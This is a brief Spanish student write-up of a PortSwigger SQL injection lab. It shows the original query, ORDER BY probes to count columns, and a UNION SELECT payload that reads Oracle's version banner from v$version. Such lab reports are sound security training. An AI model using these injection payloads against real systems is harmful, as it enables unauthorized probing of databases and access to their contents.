# README_CHRISTIAN_SANGUCHO_DIAZ
# INFORME LABORATORIO https://portswigger.net/

## Laboratorio:
Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

## Objetivo:
Conseguir la versión de Oracle

##Consulta Original: 
SELECT * FROM articles WHERE category = ‘Gifts’


## Consulta Manipulada:
Se busca el número de columnas con las siguientes instrucciones
‘ ORDER BY 1
‘ ORDER BY 2
‘ ORDER BY 3


! [Imagen búsqueda de número de columnas con error](https://github.com/mastercodelatam/wireshark_Tratamiento-de-datos-OCT24B/blob/CHRISTIAN_SANGUCHO_DIAZ1/RETO/CHRISTIAN_SANGUCHO_DIAZ1/Imagen_b%C3%BAsqueda_de_n%C3%BAmero_de_columnas_con_error.png)
! [Imagen búsqueda de número de columnas](https://github.com/mastercodelatam/wireshark_Tratamiento-de-datos-OCT24B/blob/CHRISTIAN_SANGUCHO_DIAZ1/RETO/CHRISTIAN_SANGUCHO_DIAZ1/Imagen_b%C3%BAsqueda_de_n%C3%BAmero_de_columnas.png)

## Consulta para obtener la versión de Oracle
=Gifts' UNION SELECT banner, 'NULL' FROM v$version--
! [Imagen de la Version Oracle](https://github.com/mastercodelatam/wireshark_Tratamiento-de-datos-OCT24B/blob/CHRISTIAN_SANGUCHO_DIAZ1/RETO/CHRISTIAN_SANGUCHO_DIAZ1/Imagen_de_la_Version_Oracle.png)
